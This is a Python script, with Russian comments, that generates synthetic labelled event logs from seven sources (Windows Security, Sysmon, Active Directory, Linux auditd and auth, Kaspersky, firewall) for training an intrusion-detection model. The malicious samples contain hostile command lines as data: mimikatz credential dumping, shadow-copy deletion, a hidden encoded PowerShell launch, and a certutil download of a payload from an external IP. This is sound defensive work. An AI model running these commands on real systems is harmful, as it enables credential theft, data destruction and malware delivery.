# -*- coding: utf-8 -*-
"""
Генератор синтетических данных для enterprise ML pipeline.
Создаёт по 500 событий для каждого из 7 источников логов:
  windows_security_events.json
  sysmon_events.json
  active_directory_events.json
  linux_auditd_events.json
  linux_auth_events.json
  kaspersky_events.json
  firewall_events.json
"""
import sys, os, json, random, pathlib
sys.stdout.reconfigure(encoding='utf-8')
os.chdir(os.path.dirname(os.path.abspath(__file__)))

DATASETS = pathlib.Path(__file__).parent.parent / "datasets"
DATASETS.mkdir(exist_ok=True)

rng = random.Random(42)

def ts(offset=0):
    return f"2026-04-28T{12+offset//60:02d}:{offset%60:02d}:00Z"

# ── 1. Windows Security Events (EventLog Security) ────────────────────────────
print("Generating windows_security_events.json ...")
WIN_BENIGN = [
    {"EventID": 4624, "LogonType": 2, "TargetUserName": "alice", "WorkstationName": "CORP-PC-01",
     "IpAddress": "10.0.1.5", "AuthPackage": "Negotiate"},
    {"EventID": 4634, "TargetUserName": "alice", "LogonType": 2},
    {"EventID": 4648, "TargetUserName": "fileserver$", "SubjectUserName": "alice",
     "IpAddress": "10.0.1.10"},
    {"EventID": 5140, "ShareName": "\\\\*\\SYSVOL", "SubjectUserName": "alice"},
]
WIN_MALICIOUS = [
    {"EventID": 4624, "LogonType": 3, "TargetUserName": "admin", "IpAddress": "185.220.101.45",
     "AuthPackage": "NTLM", "WorkstationName": "ATTACKER"},
    {"EventID": 4625, "TargetUserName": "administrator", "IpAddress": "185.220.101.45",
     "FailureReason": "Unknown user name or bad password"},
    {"EventID": 4698, "TaskName": "WindowsUpdater", "SubjectUserName": "finance1",
     "Command": "powershell -nop -w hidden -enc JABjAD0ATgBlAHcA"},
    {"EventID": 4720, "TargetUserName": "svc_backdoor", "SubjectUserName": "finance1"},
    {"EventID": 4728, "TargetUserName": "svc_backdoor", "GroupName": "Domain Admins"},
    {"EventID": 4648, "TargetUserName": "krbtgt", "SubjectUserName": "finance1",
     "IpAddress": "192.168.1.99", "LogonGuid": "{00000000-0000-0000-0000-000000000000}"},
    {"EventID": 4672, "SubjectUserName": "finance1", "PrivilegeList": "SeDebugPrivilege\tSeTcbPrivilege"},
    {"EventID": 4776, "TargetUserName": "administrator", "Workstation": "185.220.101.45",
     "ErrorCode": "0x0", "AuthPackage": "NTLM"},
]

win_events = []
for _ in range(350):
    e = rng.choice(WIN_BENIGN).copy()
    e["_label"] = 0; e["_source"] = "windows_security"; win_events.append(e)
for _ in range(150):
    e = rng.choice(WIN_MALICIOUS).copy()
    e["_label"] = 1; e["_source"] = "windows_security"; win_events.append(e)
rng.shuffle(win_events)
(DATASETS / "windows_security_events.json").write_text(
    json.dumps(win_events, ensure_ascii=False, indent=2), encoding="utf-8")
print(f"  → {len(win_events)} events ({sum(1 for e in win_events if e['_label']==1)} malicious)")


# ── 2. Sysmon Events ──────────────────────────────────────────────────────────
print("Generating sysmon_events.json ...")
SYSMON_BENIGN = [
    {"EventID": 1, "Image": "C:\\Windows\\System32\\svchost.exe",
     "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
     "ParentImage": "C:\\Windows\\System32\\services.exe", "User": "NT AUTHORITY\\SYSTEM",
     "Hashes": "MD5=ABC123", "Signed": True},
    {"EventID": 3, "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
     "DestinationIp": "8.8.8.8", "DestinationPort": 443, "User": "CORP\\alice", "Signed": True},
    {"EventID": 1, "Image": "C:\\Windows\\System32\\notepad.exe",
     "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
     "ParentImage": "C:\\Windows\\explorer.exe", "User": "CORP\\alice", "Signed": True},
    {"EventID": 11, "Image": "C:\\Windows\\System32\\svchost.exe",
     "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf", "User": "SYSTEM"},
]
SYSMON_MALICIOUS = [
    {"EventID": 1, "Image": "C:\\Windows\\Temp\\mimikatz.exe",
     "CommandLine": "mimikatz sekurlsa::logonpasswords exit",
     "ParentImage": "C:\\Windows\\System32\\cmd.exe", "User": "CORP\\finance1",
     "Hashes": "MD5=DEADBEEF", "Signed": False},
    {"EventID": 1, "Image": "C:\\Windows\\System32\\cmd.exe",
     "CommandLine": "cmd /c powershell -nop -w hidden -enc JABjAD0ATgBlAHcA",
     "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
     "User": "CORP\\alice", "Signed": True},
    {"EventID": 1, "Image": "C:\\Windows\\System32\\vssadmin.exe",
     "CommandLine": "vssadmin delete shadows /all /quiet",
     "ParentImage": "C:\\Windows\\System32\\cmd.exe", "User": "CORP\\finance1"},
    {"EventID": 3, "Image": "C:\\Users\\Public\\loader.exe",
     "DestinationIp": "185.220.101.45", "DestinationPort": 4444,
     "User": "CORP\\finance1", "Signed": False},
    {"EventID": 10, "SourceImage": "C:\\Windows\\System32\\cmd.exe",
     "TargetImage": "C:\\Windows\\System32\\lsass.exe",
     "GrantedAccess": "0x1010", "User": "CORP\\finance1"},
    {"EventID": 1, "Image": "C:\\Users\\Public\\locker.exe",
     "CommandLine": "locker.exe /encrypt C:\\Finance\\ /key abc123",
     "ParentImage": "C:\\Windows\\System32\\cmd.exe", "User": "CORP\\finance1", "Signed": False},
    {"EventID": 7, "Image": "C:\\Windows\\System32\\rundll32.exe",
     "ImageLoaded": "C:\\Users\\Temp\\evil.dll", "Signed": False, "User": "CORP\\alice"},
    {"EventID": 8, "SourceImage": "C:\\Windows\\System32\\powershell.exe",
     "TargetImage": "C:\\Windows\\System32\\svchost.exe",
     "StartFunction": "NtCreateThread", "User": "CORP\\alice"},
    {"EventID": 1, "Image": "C:\\Windows\\System32\\certutil.exe",
     "CommandLine": "certutil -urlcache -split -f http://185.220.101.45/stage2.exe",
     "ParentImage": "C:\\Windows\\System32\\cmd.exe", "User": "CORP\\alice"},
]

sysmon_events = []
for _ in range(350):
    e = rng.choice(SYSMON_BENIGN).copy()
    e["_label"] = 0; sysmon_events.append(e)
for _ in range(150):
    e = rng.choice(SYSMON_MALICIOUS).copy()
    e["_label"] = 1; sysmon_events.append(e)
rng.shuffle(sysmon_events)
(DATASETS / "sysmon_events.json").write_text(
    json.dumps(sysmon_events, ensure_ascii=False, indent=2), encoding="utf-8")
print(f"  → {len(sysmon_events)} events ({sum(1 for e in sysmon_events if e['_label']==1)} malicious)")


# ── 3. Active Directory Events ────────────────────────────────────────────────
print("Generating active_directory_events.json ...")
AD_BENIGN = [
    {"EventID": 4769, "ServiceName": "fileserver$", "TargetUserName": "alice@corp.local",
     "TicketEncryptionType": "0x12", "IpAddress": "10.0.1.5"},  # AES
    {"EventID": 4768, "TargetUserName": "alice@corp.local", "IpAddress": "10.0.1.5",
     "TicketOptions": "0x40810010"},
    {"EventID": 4624, "TargetUserName": "alice", "LogonType": 2, "IpAddress": "10.0.1.5"},
]
AD_MALICIOUS = [
    # Kerberoasting — RC4 ticket request for service account
    {"EventID": 4769, "ServiceName": "mssql_svc", "TargetUserName": "hacker@corp.local",
     "TicketEncryptionType": "0x17", "IpAddress": "185.220.101.45"},
    # DCSync — replication rights requested
    {"EventID": 4662, "ObjectType": "domainDNS", "AccessMask": "0x100",
     "SubjectUserName": "finance1", "Properties": "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"},
    # Admin account creation
    {"EventID": 4720, "TargetUserName": "backdoor_admin", "SubjectUserName": "finance1"},
    {"EventID": 4728, "TargetUserName": "backdoor_admin", "SubjectUserName": "finance1",
     "GroupName": "Domain Admins"},
    # Golden Ticket
    {"EventID": 4768, "TargetUserName": "krbtgt", "TicketOptions": "0x60810010",
     "IpAddress": "192.168.100.5", "TicketEncryptionType": "0x17"},
    # Pass-the-Hash
    {"EventID": 4648, "SubjectUserName": "finance1", "TargetUserName": "administrator",
     "IpAddress": "185.220.101.45", "LogonGuid": "{00000000-0000-0000-0000-000000000000}"},
]

ad_events = []
for _ in range(350):
    e = rng.choice(AD_BENIGN).copy()
    e["_label"] = 0; ad_events.append(e)
for _ in range(150):
    e = rng.choice(AD_MALICIOUS).copy()
    e["_label"] = 1; ad_events.append(e)
rng.shuffle(ad_events)
(DATASETS / "active_directory_events.json").write_text(
    json.dumps(ad_events, ensure_ascii=False, indent=2), encoding="utf-8")
print(f"  → {len(ad_events)} events ({sum(1 for e in ad_events if e['_label']==1)} malicious)")


# ── 4. Linux Auditd Events ────────────────────────────────────────────────────
print("Generating linux_auditd_events.json ...")
LINUX_BENIGN = [
    {"type": "SYSCALL", "syscall": "execve", "exe": "/usr/bin/ls", "uid": "1001",
     "euid": "1001", "auid": "1001", "comm": "ls", "key": ""},
    {"type": "SYSCALL", "syscall": "openat", "exe": "/usr/bin/cat",
     "a0": "/etc/hosts", "uid": "1001", "euid": "1001", "auid": "1001"},
    {"type": "PROCTITLE", "proctitle": "sshd: alice@pts/0", "uid": "0", "euid": "0",
     "auid": "1001", "exe": "/usr/sbin/sshd"},
]
LINUX_MALICIOUS = [
    # SUID escalation
    {"type": "SYSCALL", "syscall": "execve", "exe": "/tmp/exploit",
     "uid": "1001", "euid": "0", "auid": "1001", "comm": "exploit", "key": ""},
    # Credential access
    {"type": "SYSCALL", "syscall": "openat", "exe": "/usr/bin/cat",
     "a0": "/etc/shadow", "uid": "0", "euid": "0", "auid": "4294967295"},
    # Execution from tmp
    {"type": "EXECVE", "exe": "/tmp/backdoor.sh", "a0": "/tmp/backdoor.sh",
     "uid": "1001", "euid": "1001", "auid": "4294967295"},
    # Kernel module
    {"type": "SYSCALL", "syscall": "init_module", "exe": "/sbin/insmod",
     "comm": "insmod", "uid": "0", "euid": "0", "auid": "0",
     "key": "modules"},
    # Network reverse shell
    {"type": "SYSCALL", "syscall": "connect", "exe": "/tmp/rev_shell",
     "uid": "33", "euid": "33", "auid": "4294967295", "key": ""},
    # Passwd modification
    {"type": "PATH", "name": "/etc/passwd", "nametype": "NORMAL", "mode": "0100644",
     "exe": "/usr/bin/vi", "uid": "0", "auid": "4294967295"},
]

linux_auditd = []
for _ in range(350):
    e = rng.choice(LINUX_BENIGN).copy()
    e["_label"] = 0; linux_auditd.append(e)
for _ in range(150):
    e = rng.choice(LINUX_MALICIOUS).copy()
    e["_label"] = 1; linux_auditd.append(e)
rng.shuffle(linux_auditd)
(DATASETS / "linux_auditd_events.json").write_text(
    json.dumps(linux_auditd, ensure_ascii=False, indent=2), encoding="utf-8")
print(f"  → {len(linux_auditd)} events ({sum(1 for e in linux_auditd if e['_label']==1)} malicious)")


# ── 5. Linux Auth.log Events ──────────────────────────────────────────────────
print("Generating linux_auth_events.json ...")
AUTH_BENIGN = [
    {"raw": "Apr 28 10:01:05 server sshd[1234]: Accepted publickey for alice from 10.0.1.5 port 54321 ssh2"},
    {"raw": "Apr 28 10:05:22 server sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt-get update"},
    {"raw": "Apr 28 08:00:01 server cron[891]: pam_unix(cron:session): session opened for user root by (uid=0)"},
    {"raw": "Apr 28 09:30:11 server login[5678]: pam_unix(login:session): session opened for user bob by LOGIN(uid=0)"},
]
AUTH_MALICIOUS = [
    {"raw": "Apr 28 14:02:01 server sshd[2222]: Failed password for root from 185.220.101.45 port 22 ssh2"},
    {"raw": "Apr 28 14:02:03 server sshd[2222]: Failed password for root from 185.220.101.45 port 22 ssh2"},
    {"raw": "Apr 28 14:02:05 server sshd[2222]: Failed password for root from 185.220.101.45 port 22 ssh2"},
    {"raw": "Apr 28 14:02:07 server sshd[2222]: Failed password for admin from 185.220.101.45 port 22 ssh2"},
    {"raw": "Apr 28 14:03:00 server sshd[2223]: Accepted password for root from 185.220.101.45 port 22 ssh2"},
    {"raw": "Apr 28 14:03:10 server sudo: UNKNOWN_USER : user NOT in sudoers ; TTY=pts/1 ; COMMAND=/bin/bash"},
    {"raw": "Apr 28 14:03:15 server su: pam_unix(su:auth): authentication failure; logname= uid=1001 euid=0"},
]

auth_events = []
for _ in range(350):
    e = rng.choice(AUTH_BENIGN).copy()
    e["_label"] = 0; auth_events.append(e)
for _ in range(150):
    e = rng.choice(AUTH_MALICIOUS).copy()
    e["_label"] = 1; auth_events.append(e)
rng.shuffle(auth_events)
(DATASETS / "linux_auth_events.json").write_text(
    json.dumps(auth_events, ensure_ascii=False, indent=2), encoding="utf-8")
print(f"  → {len(auth_events)} events ({sum(1 for e in auth_events if e['_label']==1)} malicious)")


# ── 6. Kaspersky KES/KSC Events ───────────────────────────────────────────────
print("Generating kaspersky_events.json ...")
KAV_BENIGN = [
    {"EventType": "On-Demand Scan Completed", "Host": "CORP-PC-01",
     "User": "CORP\\alice", "DetectionResult": "", "ThreatName": "", "FilePath": ""},
    {"EventType": "Database Updated", "Host": "CORP-PC-01",
     "DatabaseVersion": "2026-04-28", "DetectionResult": ""},
    {"EventType": "Application Control Event", "Host": "CORP-PC-01",
     "Application": "chrome.exe", "Action": "Allowed", "DetectionResult": ""},
]
KAV_MALICIOUS = [
    {"EventType": "Threat Detected", "Host": "FINANCE-PC-01",
     "User": "CORP\\finance1",
     "ThreatName": "Trojan.Win32.Emotet.gen", "FilePath": "C:\\Users\\finance1\\AppData\\Local\\Temp\\doc.exe",
     "Action": "Detected", "DetectionResult": "detected",
     "MD5": "DEADBEEFDEADBEEF"},
    {"EventType": "Threat Detected", "Host": "FINANCE-PC-01",
     "ThreatName": "PDM:Trojan.Win32.Generic", "FilePath": "C:\\Windows\\Temp\\loader.exe",
     "Action": "Blocked", "DetectionResult": "blocked"},
    {"EventType": "Threat Detected", "Host": "CORP-PC-05",
     "ThreatName": "Ransomware.Win32.Conti.a", "FilePath": "C:\\Users\\bob\\Desktop\\invoice.exe",
     "Action": "Detected", "DetectionResult": "detected"},
    {"EventType": "Exploit Prevention",
     "ThreatName": "Exploit.Win32.CVE-2021-40444", "Host": "CORP-PC-03",
     "Application": "WINWORD.EXE", "Action": "Blocked", "DetectionResult": "blocked"},
    {"EventType": "Behavior Detection",
     "ThreatName": "HEUR:Backdoor.Win32.CobaltStrike.gen", "Host": "CORP-PC-02",
     "FilePath": "C:\\Windows\\Temp\\beacon.dll", "Action": "Detected", "DetectionResult": "detected"},
    {"EventType": "Network Attack Blocked",
     "ThreatName": "Intrusion.Win.MS17-010.DoublePulsar", "Host": "CORP-SRV-01",
     "SourceIP": "185.220.101.45", "Action": "Blocked", "DetectionResult": "blocked"},
]

kav_events = []
for _ in range(350):
    e = rng.choice(KAV_BENIGN).copy()
    e["_label"] = 0; kav_events.append(e)
for _ in range(150):
    e = rng.choice(KAV_MALICIOUS).copy()
    e["_label"] = 1; kav_events.append(e)
rng.shuffle(kav_events)
(DATASETS / "kaspersky_events.json").write_text(
    json.dumps(kav_events, ensure_ascii=False, indent=2), encoding="utf-8")
print(f"  → {len(kav_events)} events ({sum(1 for e in kav_events if e['_label']==1)} malicious)")


# ── 7. Firewall Events ────────────────────────────────────────────────────────
print("Generating firewall_events.json ...")
FW_BENIGN = [
    {"Action": "ALLOW", "SrcIP": "10.0.1.5", "DstIP": "8.8.8.8",
     "DstPort": 443, "Protocol": "TCP", "BytesSent": 1024, "Application": "chrome.exe"},
    {"Action": "ALLOW", "SrcIP": "10.0.1.10", "DstIP": "10.0.0.5",
     "DstPort": 445, "Protocol": "TCP", "BytesSent": 512, "Application": "svchost.exe"},
    {"Action": "ALLOW", "SrcIP": "10.0.1.5", "DstIP": "172.16.0.1",
     "DstPort": 80, "Protocol": "TCP", "BytesSent": 2048, "Application": ""},
    {"Action": "DENY", "SrcIP": "0.0.0.0", "DstIP": "10.0.1.5",
     "DstPort": 8080, "Protocol": "TCP", "BytesSent": 0},
]
FW_MALICIOUS = [
    # C2 beacon on unusual port
    {"Action": "ALLOW", "SrcIP": "10.0.1.99", "DstIP": "185.220.101.45",
     "DstPort": 4444, "Protocol": "TCP", "BytesSent": 512, "Application": "powershell.exe"},
    # TOR exit node
    {"Action": "ALLOW", "SrcIP": "10.0.1.50", "DstIP": "195.176.3.23",
     "DstPort": 9001, "Protocol": "TCP", "BytesSent": 2048, "Application": ""},
    # Large data exfil
    {"Action": "ALLOW", "SrcIP": "10.0.1.99", "DstIP": "185.220.101.45",
     "DstPort": 443, "Protocol": "TCP", "BytesSent": 150_000_000, "Application": "locker.exe"},
    # RDP from external
    {"Action": "ALLOW", "SrcIP": "185.220.101.45", "DstIP": "10.0.0.1",
     "DstPort": 3389, "Protocol": "TCP", "BytesSent": 10240, "Application": ""},
    # Netcat/bind shell
    {"Action": "ALLOW", "SrcIP": "10.0.1.5", "DstIP": "185.220.101.45",
     "DstPort": 1337, "Protocol": "TCP", "BytesSent": 256, "Application": "nc.exe"},
    # SMB lateral movement to 20 hosts
    {"Action": "ALLOW", "SrcIP": "10.0.1.99", "DstIP": "10.0.1.20",
     "DstPort": 445, "Protocol": "TCP", "BytesSent": 8096, "Application": "cmd.exe"},
]

fw_events = []
for _ in range(350):
    e = rng.choice(FW_BENIGN).copy()
    e["_label"] = 0; fw_events.append(e)
for _ in range(150):
    e = rng.choice(FW_MALICIOUS).copy()
    e["_label"] = 1; fw_events.append(e)
rng.shuffle(fw_events)
(DATASETS / "firewall_events.json").write_text(
    json.dumps(fw_events, ensure_ascii=False, indent=2), encoding="utf-8")
print(f"  → {len(fw_events)} events ({sum(1 for e in fw_events if e['_label']==1)} malicious)")

# ── Summary ───────────────────────────────────────────────────────────────────
total = len(win_events)+len(sysmon_events)+len(ad_events)+len(linux_auditd)+len(auth_events)+len(kav_events)+len(fw_events)
mal   = sum(e["_label"] for events in [win_events,sysmon_events,ad_events,linux_auditd,auth_events,kav_events,fw_events] for e in events)
print()
print(f"{'='*60}")
print(f"  ИТОГО сгенерировано: {total} событий")
print(f"  Malicious: {mal} ({100*mal/total:.1f}%)   Benign: {total-mal} ({100*(total-mal)/total:.1f}%)")
print(f"  Источники: 7 (Windows Security, Sysmon, AD, Linux Auditd,")
print(f"             Linux Auth, Kaspersky KES, Firewall)")
print(f"  Путь: {DATASETS}")
print(f"{'='*60}")
